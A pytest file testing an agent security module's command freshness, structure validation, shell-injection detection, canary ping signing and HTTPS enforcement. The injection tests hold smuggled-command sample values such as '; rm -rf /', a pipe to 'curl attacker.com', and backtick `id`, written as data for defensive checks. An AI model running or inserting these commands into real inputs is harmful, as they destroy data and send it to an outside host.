"""
P14 — SPECTER Agent Security module tests.

Unit tests for asc-agent/specter/security.py:

  TestIsCommandFresh     — Timestamp-based freshness validation   (5)
  TestValidateCommand    — Full command structure validation       (6)
  TestCheckParamInjection — Shell metacharacter detection         (6)
  TestHandleCanaryPing   — Canary ping nonce signing              (4)
  TestEnforceHttps       — HTTPS enforcement (warn/raise)         (5)

Total: 26 tests
"""

import time
import warnings
from unittest.mock import patch

import pytest

import base64
import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey
from cryptography.hazmat.primitives.serialization import (
    Encoding, NoEncryption, PrivateFormat, PublicFormat,
)

from specter.security import (
    check_param_injection,
    enforce_https,
    handle_canary_ping,
    is_command_fresh,
    validate_command,
)
from specter.identity import sign_event, verify_command


# ── Crypto helpers (mirrored inline, same pattern as test_identity.py) ─────────

def _generate_keypair() -> tuple[str, str]:
    key = Ed25519PrivateKey.generate()
    priv = base64.b64encode(
        key.private_bytes(Encoding.Raw, PrivateFormat.Raw, NoEncryption())
    ).decode()
    pub = base64.b64encode(
        key.public_key().public_bytes(Encoding.Raw, PublicFormat.Raw)
    ).decode()
    return priv, pub


def _sign(priv_b64: str, payload: dict) -> str:
    return sign_event(priv_b64, payload)


def _verify(pub_b64: str, payload: dict, sig: str) -> bool:
    return verify_command(pub_b64, payload, sig)


# ── Helpers ────────────────────────────────────────────────────────────────────

def _make_cmd(**overrides) -> dict:
    """Build a valid command dict with optional overrides."""
    base = {
        "id": "cmd-test-001",
        "command_type": "kill_process",
        "params": {"pid": 1234},
        "ts": time.time(),
        "signature": "fakesig",
    }
    base.update(overrides)
    return base


# ══════════════════════════════════════════════════════════════════════════════
#  TestIsCommandFresh
# ══════════════════════════════════════════════════════════════════════════════

class TestIsCommandFresh:
    def test_current_timestamp_is_fresh(self):
        cmd = _make_cmd(ts=time.time())
        assert is_command_fresh(cmd) is True

    def test_timestamp_400s_old_is_stale(self):
        cmd = _make_cmd(ts=time.time() - 400)
        assert is_command_fresh(cmd) is False

    def test_missing_ts_is_not_fresh(self):
        cmd = _make_cmd()
        del cmd["ts"]
        assert is_command_fresh(cmd) is False

    def test_future_within_60s_is_accepted(self):
        # Tolerate up to 60s of clock skew
        cmd = _make_cmd(ts=time.time() + 55)
        assert is_command_fresh(cmd) is True

    def test_invalid_ts_type_is_not_fresh(self):
        cmd = _make_cmd(ts="not-a-number")
        assert is_command_fresh(cmd) is False

    def test_custom_window_respected(self):
        cmd = _make_cmd(ts=time.time() - 10)
        assert is_command_fresh(cmd, window_seconds=5) is False
        assert is_command_fresh(cmd, window_seconds=60) is True


# ══════════════════════════════════════════════════════════════════════════════
#  TestValidateCommand
# ══════════════════════════════════════════════════════════════════════════════

class TestValidateCommand:
    def test_valid_command_passes(self):
        cmd = _make_cmd()
        valid, reason = validate_command(cmd)
        assert valid is True
        assert reason == "ok"

    def test_missing_id_fails(self):
        cmd = _make_cmd()
        del cmd["id"]
        valid, reason = validate_command(cmd)
        assert valid is False
        assert "id" in reason

    def test_missing_command_type_fails(self):
        cmd = _make_cmd()
        del cmd["command_type"]
        valid, reason = validate_command(cmd)
        assert valid is False

    def test_params_not_dict_fails(self):
        cmd = _make_cmd(params="not-a-dict")
        valid, reason = validate_command(cmd)
        assert valid is False
        assert "params" in reason

    def test_stale_command_fails(self):
        cmd = _make_cmd(ts=time.time() - 400)
        valid, reason = validate_command(cmd)
        assert valid is False
        assert "stale" in reason.lower() or "ts" in reason

    def test_command_type_not_string_fails(self):
        cmd = _make_cmd(command_type=42)
        valid, reason = validate_command(cmd)
        assert valid is False


# ══════════════════════════════════════════════════════════════════════════════
#  TestCheckParamInjection
# ══════════════════════════════════════════════════════════════════════════════

class TestCheckParamInjection:
    def test_clean_ip_not_flagged(self):
        assert check_param_injection({"ip": "192.168.1.1"}) == []

    def test_semicolon_in_ip_flagged(self):
        flagged = check_param_injection({"ip": "1.2.3.4; rm -rf /"})
        assert "ip" in flagged

    def test_pipe_in_path_flagged(self):
        flagged = check_param_injection({"path": "/tmp/file | curl attacker.com"})
        assert "path" in flagged

    def test_backtick_flagged(self):
        flagged = check_param_injection({"path": "`id`"})
        assert "path" in flagged

    def test_integer_param_not_flagged(self):
        assert check_param_injection({"pid": 9999}) == []

    def test_multiple_injection_params_all_flagged(self):
        flagged = check_param_injection({
            "ip": "1.2.3.4; whoami",
            "path": "/tmp/evil`id`",
        })
        assert "ip" in flagged
        assert "path" in flagged


# ══════════════════════════════════════════════════════════════════════════════
#  TestHandleCanaryPing
# ══════════════════════════════════════════════════════════════════════════════

class TestHandleCanaryPing:
    def test_returns_pong_key(self):
        priv, pub = _generate_keypair()
        result = handle_canary_ping(priv, {"nonce": "test-nonce"})
        assert "pong" in result

    def test_returns_nonce_key(self):
        priv, pub = _generate_keypair()
        result = handle_canary_ping(priv, {"nonce": "test-nonce"})
        assert result["nonce"] == "test-nonce"

    def test_pong_is_valid_ed25519_signature(self):
        priv, pub = _generate_keypair()
        nonce = "verify-this-nonce"
        result = handle_canary_ping(priv, {"nonce": nonce})
        # The pong should be a valid signature over {"nonce": nonce}
        assert _verify(pub, {"nonce": nonce}, result["pong"]) is True

    def test_pong_is_base64_string(self):
        priv, pub = _generate_keypair()
        result = handle_canary_ping(priv, {"nonce": "b64-test"})
        pong = result["pong"]
        assert isinstance(pong, str)
        assert len(pong) > 0


# ══════════════════════════════════════════════════════════════════════════════
#  TestEnforceHttps
# ══════════════════════════════════════════════════════════════════════════════

class TestEnforceHttps:
    def test_https_url_no_warning(self):
        with warnings.catch_warnings(record=True) as w:
            warnings.simplefilter("always")
            enforce_https("https://asc.premoscorp.com")
            assert len(w) == 0

    def test_http_url_emits_warning(self):
        with warnings.catch_warnings(record=True) as w:
            warnings.simplefilter("always")
            enforce_https("http://localhost:8000")
            assert len(w) == 1
            assert "HTTPS" in str(w[0].message) or "https" in str(w[0].message).lower()

    def test_http_url_strict_mode_raises(self):
        with pytest.raises(RuntimeError, match="SPECTER-GUARD"):
            enforce_https("http://attacker.example.com", strict=True)

    def test_https_url_strict_mode_no_error(self):
        enforce_https("https://secure.premoscorp.com", strict=True)  # should not raise

    def test_http_warning_contains_url(self):
        with warnings.catch_warnings(record=True) as w:
            warnings.simplefilter("always")
            enforce_https("http://insecure-backend:8000")
            assert "insecure-backend" in str(w[0].message)
